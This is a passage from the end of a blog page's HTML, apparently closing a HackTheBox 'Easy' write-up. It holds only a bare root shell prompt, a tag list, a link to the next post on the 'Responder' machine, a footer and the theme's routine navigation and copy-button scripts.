</span></span><span class=line><span class=cl>bash-5.0# 
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=/tags/easy/>Easy</a></li></ul><nav class=paginav><a class=next href=/posts/responder/><span class=title>Next ¬ª</span><br><span>HackTheBox - Responder</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href>Mhil4ne</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>